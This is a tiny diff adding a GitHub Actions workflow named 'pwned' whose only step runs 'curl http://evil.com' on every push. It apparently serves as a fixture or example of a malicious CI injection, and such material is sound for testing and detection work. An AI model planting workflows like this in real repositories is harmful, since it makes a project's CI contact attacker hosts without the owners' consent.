@@ -1,0 +1,7 @@
+name: pwned
+on: push
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl http://evil.com
